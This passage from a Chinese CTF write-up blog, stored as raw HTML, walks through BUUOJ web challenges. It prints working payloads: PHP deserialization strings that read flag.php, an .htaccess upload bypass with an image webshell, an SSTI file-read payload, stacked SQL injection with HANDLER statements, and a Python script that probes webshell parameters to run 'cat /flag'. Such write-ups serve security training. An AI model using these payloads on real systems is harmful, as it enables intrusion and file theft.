&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt;(&lt;span style="color:#a6e22e"&gt;is_valid&lt;/span&gt;($str)) {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $obj &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;unserialize&lt;/span&gt;($str);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;需要payload中的字符ascii码值&lt;code&gt;大于&lt;/code&gt;32&lt;code&gt;小于&lt;/code&gt;125。注意到最后有一个&lt;code&gt;unserialize&lt;/code&gt;函数，判断这道题考点是反序列化。接下来分析源码：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;process()&lt;/code&gt;函数判断op的值，如果是&lt;code&gt;1&lt;/code&gt;就写入文件，如果是&lt;code&gt;2&lt;/code&gt;就读取文件。代码开头包含了&lt;code&gt;flag.php&lt;/code&gt;文件，所以推测需要使用2操作数读取flag.php文件。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;write()&lt;/code&gt;把对象中的&lt;code&gt;$content&lt;/code&gt;属性值写入到&lt;code&gt;$filename&lt;/code&gt;文件中，如果长度大于100会被拦下。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;read()&lt;/code&gt;使用**file_get_contents()**函数读取文件。&lt;strong&gt;正是我们想要的&lt;/strong&gt;。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;output()&lt;/code&gt;输出内容。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;__destruct()&lt;/code&gt;对象销毁时会执行的函数，需要注意的是&lt;strong&gt;if&lt;/strong&gt;判断里的&lt;code&gt;$this-&amp;gt;op === &amp;quot;2&amp;quot;&lt;/code&gt;是强比较，并且会修改op的值为1（写文件），因为**&amp;ldquo;2&amp;rdquo;&lt;strong&gt;是一个字符串类型的如果传入&lt;/strong&gt;整型的2**即可绕过。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;所以我们构造一个对象&lt;strong&gt;op&lt;/strong&gt;为2，&lt;strong&gt;filename&lt;/strong&gt;为flag.php即可，读文件的时候肯定不是&lt;/p&gt;
&lt;p&gt;接下来是反序列化时会遇到的问题，因为对象中属性的修饰是&lt;code&gt;protected&lt;/code&gt;，序列化时需要保证一致的。&lt;/p&gt;
&lt;p&gt;先给出自己创建的对象源码&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-php" data-lang="php"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;&amp;lt;?&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;php&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;class&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;FileHandler&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;protected&lt;/span&gt; $op&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;2&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;protected&lt;/span&gt; $filename&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;/var/www/html/flag.php&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;protected&lt;/span&gt; $content;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;$c &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;new&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;FileHandler&lt;/span&gt;();
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;echo&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;serialize&lt;/span&gt;($c);
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ol&gt;
&lt;li&gt;PHP7.1以上版本对属性类型不敏感、用public绕过:&lt;/li&gt;
&lt;/ol&gt;
&lt;pre tabindex="0"&gt;&lt;code class="language-code" data-lang="code"&gt;O:11:&amp;#34;FileHandler&amp;#34;:3:{s:2:&amp;#34;op&amp;#34;;i:2;s:8:&amp;#34;filename&amp;#34;;s:22:&amp;#34;/var/www/html/flag.php&amp;#34;;s:7:&amp;#34;content&amp;#34;;N;}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;运行以后可以在网页注释中找到文件。绝对路径读取也可以，我第一次使用php://filter读再去解码也成功了。&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code class="language-code" data-lang="code"&gt;O:11:&amp;#34;FileHandler&amp;#34;:3:{s:2:&amp;#34;op&amp;#34;;i:2;s:8:&amp;#34;filename&amp;#34;;s:52:&amp;#34;php://filter/convert.base64-encode/resource=flag.php&amp;#34;;s:7:&amp;#34;content&amp;#34;;N;}
&lt;/code&gt;&lt;/pre&gt;&lt;ol start="2"&gt;
&lt;li&gt;序列化字符串中s替换为S，支持字符串用16进制，&lt;/li&gt;
&lt;/ol&gt;
&lt;pre tabindex="0"&gt;&lt;code class="language-code" data-lang="code"&gt;O:11:&amp;#34;FileHandler&amp;#34;:3:{S:5:&amp;#34;\00*\00op&amp;#34;;i:2;S:11:&amp;#34;\00*\00filename&amp;#34;;S:22:&amp;#34;/var/www/html/flag.php&amp;#34;;S:10:&amp;#34;\00*\00content&amp;#34;;N;}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;思路：https://blog.csdn.net/Oavinci/article/details/106998738&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id="mrctf2020你传你呢"&gt;[MRCTF2020]你传你🐎呢
&lt;/h1&gt;&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210308104930.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;测试后缀，php、phtml都被过滤了，htaccess可以，先传上特供的&lt;code&gt;.htaccess&lt;/code&gt;&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code class="language-code" data-lang="code"&gt;SetHandler application/x-httpd-php
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210308105247.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;传图片马，我一直用的是GIF马，几次尝试都没通过，后来修改了&lt;code&gt;Content-Type: image/jpeg&lt;/code&gt;可以了，说明Content-Type是GIF还不行，接下来直接传图片码&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210308105652.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;根据地址访问图片马的地址，使用system读文件还没成，用蚁剑连了执行执行ret=127,disable_function了&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210308110126.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;不过根目录下的flag文件还是可以正常读取，至于disable_function可以参考&lt;a class="link" href="https://braindance.tk/2020/%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019%5DRCE%20ME/" target="_blank" rel="noopener"
&gt;【极客大挑战 2019】RCE ME&lt;/a&gt;。&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id="bjdctf-2ndfake-google"&gt;[BJDCTF 2nd]fake google
&lt;/h1&gt;&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210308110510.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;就一个输入框，随便输入一个去看看，跳转以后&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210308110545.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;注释里有提示ssti，应该是模板注入，就在网上搜一个ssti的payload试试&lt;a class="link" href="https://blog.csdn.net/qq_40657585/article/details/83657220" target="_blank" rel="noopener"
&gt;SSTI (服务器模板注入)&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;找到了一个直接读文件的payload&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code class="language-code" data-lang="code"&gt;?name={% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__==&amp;#39;catch_warnings&amp;#39; %}{{ c.__init__.__globals__[&amp;#39;__builtins__&amp;#39;].open(&amp;#39;/flag&amp;#39;, &amp;#39;r&amp;#39;).read() }}{% endif %}{% endfor %}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210308110717.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id="gyctf2020blacklist"&gt;[GYCTF2020]Blacklist
&lt;/h1&gt;&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210308110821.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;sql注入，先试一试堆叠注入，可以执行，尝试select的时候返回了过滤内容&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-php" data-lang="php"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;return&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;preg_match&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#34;/set|prepare|alter|rename|select|update|delete|drop|insert|where|\./i&amp;#34;&lt;/span&gt;,$inject);
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;前面还有一个堆叠注入的是新姿势**[强网杯 2019]随便注**，一种是使用prepare预处理语句，另一种是修改表名，根据上面的过滤内容，两种方法都被过滤了。先试试查看表：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-sql" data-lang="sql"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;-&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;1&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#39;;show tables;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#e6db74"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#e6db74"&gt;FlagHere
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#e6db74"&gt;words
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;查看表结构：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-sql" data-lang="sql"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;-&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;1&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#39;;desc `FlagHere`;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;接下来是看的wp，学到了个新姿势：使用&lt;code&gt;HANDLER ... OPEN&lt;/code&gt;语句，贴一个&lt;a class="link" href="https://dev.mysql.com/doc/refman/8.0/en/handler.html" target="_blank" rel="noopener"
&gt;官方文档&lt;/a&gt;。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;HANDLER ... OPEN&lt;/code&gt;语句打开一个表，使其可以使用后续&lt;code&gt;HANDLER ... READ&lt;/code&gt;语句访问，该表对象未被其他会话共享，并且在会话调用&lt;code&gt;HANDLER ... CLOSE&lt;/code&gt;或会话终止之前不会关闭&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-sql" data-lang="sql"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;-&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;1&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#39;;handler FlagHere open;handler FlagHere read first;handler FlagHere close
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210308111414.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id="强网杯-2019高明的黑客"&gt;[强网杯 2019]高明的黑客
&lt;/h1&gt;&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210308112326.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;下载源码以后一堆不可读的源码，但是里面有很多shell，看不懂所以找了wp，思路就是用脚本匹配文件中的shell，然后传参试一试每一个shell是否能用，抄脚本&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-python" data-lang="python"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;# codeing = utf-8&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;import&lt;/span&gt; requests
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;import&lt;/span&gt; os
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;import&lt;/span&gt; re
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;import&lt;/span&gt; threading
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;import&lt;/span&gt; time
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;requests&lt;span style="color:#f92672"&gt;.&lt;/span&gt;adapters&lt;span style="color:#f92672"&gt;.&lt;/span&gt;DEFAULT_RETRIES &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;8&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;session &lt;span style="color:#f92672"&gt;=&lt;/span&gt; requests&lt;span style="color:#f92672"&gt;.&lt;/span&gt;session()
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;session&lt;span style="color:#f92672"&gt;.&lt;/span&gt;keep_alive &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;False&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;sem&lt;span style="color:#f92672"&gt;=&lt;/span&gt;threading&lt;span style="color:#f92672"&gt;.&lt;/span&gt;Semaphore(&lt;span style="color:#ae81ff"&gt;30&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;url&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;http://84fa677d-e4dd-47a1-9124-1823cc996d12.node3.buuoj.cn/&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;path &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;D:\DROPS\phpstudy_pro\WWW\ctf\src&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;\\&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;fileNames &lt;span style="color:#f92672"&gt;=&lt;/span&gt; os&lt;span style="color:#f92672"&gt;.&lt;/span&gt;listdir(path)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;rrGET &lt;span style="color:#f92672"&gt;=&lt;/span&gt; re&lt;span style="color:#f92672"&gt;.&lt;/span&gt;compile(&lt;span style="color:#e6db74"&gt;r&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;\$_GET\[\&amp;#39;(\w+)\&amp;#39;\]&amp;#34;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;rrPOST &lt;span style="color:#f92672"&gt;=&lt;/span&gt; re&lt;span style="color:#f92672"&gt;.&lt;/span&gt;compile(&lt;span style="color:#e6db74"&gt;r&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;\$_POST\[\&amp;#39;(\w+)\&amp;#39;\]&amp;#34;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;local_file &lt;span style="color:#f92672"&gt;=&lt;/span&gt; open(&lt;span style="color:#e6db74"&gt;&amp;#34;flag.txt&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;w&amp;#34;&lt;/span&gt;,encoding&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;utf-8&amp;#34;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;def&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;run&lt;/span&gt;(fileName):
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;with&lt;/span&gt; sem:
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; file &lt;span style="color:#f92672"&gt;=&lt;/span&gt; open(path&lt;span style="color:#f92672"&gt;+&lt;/span&gt;fileName,&lt;span style="color:#e6db74"&gt;&amp;#39;r&amp;#39;&lt;/span&gt;,encoding&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#39;utf-8&amp;#39;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; content &lt;span style="color:#f92672"&gt;=&lt;/span&gt; file&lt;span style="color:#f92672"&gt;.&lt;/span&gt;read()
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; print(&lt;span style="color:#e6db74"&gt;&amp;#34;[+]checking: &lt;/span&gt;&lt;span style="color:#e6db74"&gt;%s&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;&lt;/span&gt;&lt;span style="color:#f92672"&gt;%&lt;/span&gt;fileName)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#75715e"&gt;#GET&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;for&lt;/span&gt; i &lt;span style="color:#f92672"&gt;in&lt;/span&gt; rrGET&lt;span style="color:#f92672"&gt;.&lt;/span&gt;findall(content):
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; r &lt;span style="color:#f92672"&gt;=&lt;/span&gt; session&lt;span style="color:#f92672"&gt;.&lt;/span&gt;get(url&lt;span style="color:#f92672"&gt;+&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;&lt;/span&gt;&lt;span style="color:#e6db74"&gt;%s&lt;/span&gt;&lt;span style="color:#e6db74"&gt;?&lt;/span&gt;&lt;span style="color:#e6db74"&gt;%s&lt;/span&gt;&lt;span style="color:#e6db74"&gt;=&lt;/span&gt;&lt;span style="color:#e6db74"&gt;%s&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;&lt;/span&gt;&lt;span style="color:#f92672"&gt;%&lt;/span&gt;(fileName,i,&lt;span style="color:#e6db74"&gt;&amp;#34;echo ~guobanghhh~&amp;#34;&lt;/span&gt;))
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;~guobanghhh~&amp;#34;&lt;/span&gt; &lt;span style="color:#f92672"&gt;in&lt;/span&gt; r&lt;span style="color:#f92672"&gt;.&lt;/span&gt;text:
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; flag &lt;span style="color:#f92672"&gt;=&lt;/span&gt; fileName &lt;span style="color:#f92672"&gt;+&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;中的&amp;#34;&lt;/span&gt; &lt;span style="color:#f92672"&gt;+&lt;/span&gt; i &lt;span style="color:#f92672"&gt;+&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;可以用！！！&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; print(flag)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; local_file&lt;span style="color:#f92672"&gt;.&lt;/span&gt;write(flag)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#75715e"&gt;#POST&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#75715e"&gt;# for i in rrPOST.findall(content):&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#75715e"&gt;# r = session.post(url+fileName,data={i:&amp;#34;echo ~guobanghhh~&amp;#34;})&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#75715e"&gt;# if &amp;#34;~guobanghhh~&amp;#34; in r.text:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#75715e"&gt;# flag = fileName + &amp;#34;中的&amp;#34; + i + &amp;#34;可以用！！！&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#75715e"&gt;# print(flag)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#75715e"&gt;# local_file.write(flag)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; __name__ &lt;span style="color:#f92672"&gt;==&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;__main__&amp;#39;&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; run(&lt;span style="color:#e6db74"&gt;&amp;#34;xk0SzyKwfzw.php&amp;#34;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; start_time &lt;span style="color:#f92672"&gt;=&lt;/span&gt; time&lt;span style="color:#f92672"&gt;.&lt;/span&gt;time() &lt;span style="color:#75715e"&gt;# 开始时间&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; print(&lt;span style="color:#e6db74"&gt;&amp;#34;[start]程序开始:&amp;#34;&lt;/span&gt; &lt;span style="color:#f92672"&gt;+&lt;/span&gt; str(start_time))
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; thread_list &lt;span style="color:#f92672"&gt;=&lt;/span&gt; []
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;for&lt;/span&gt; fileName &lt;span style="color:#f92672"&gt;in&lt;/span&gt; fileNames:
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; t &lt;span style="color:#f92672"&gt;=&lt;/span&gt; threading&lt;span style="color:#f92672"&gt;.&lt;/span&gt;Thread(target&lt;span style="color:#f92672"&gt;=&lt;/span&gt;run,args&lt;span style="color:#f92672"&gt;=&lt;/span&gt;(fileName,))
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; thread_list&lt;span style="color:#f92672"&gt;.&lt;/span&gt;append(t)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;for&lt;/span&gt; t &lt;span style="color:#f92672"&gt;in&lt;/span&gt; thread_list:
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; t&lt;span style="color:#f92672"&gt;.&lt;/span&gt;start()
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;for&lt;/span&gt; t &lt;span style="color:#f92672"&gt;in&lt;/span&gt; thread_list:
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; t&lt;span style="color:#f92672"&gt;.&lt;/span&gt;join()
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;结果就是访问&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code class="language-url" data-lang="url"&gt;http://dd1c66d5-66b2-4b82-a2a8-bf7bfbecdd97.node3.buuoj.cn/xk0SzyKwfzw.php?Efa5BVG=cat%20/flag
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;获得flag&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id="mrctf2020ez_bypass"&gt;[MRCTF2020]Ez_bypass
&lt;/h1&gt;&lt;p&gt;不截图了，主页没有代码格式，贴一个源码&lt;/p&gt;
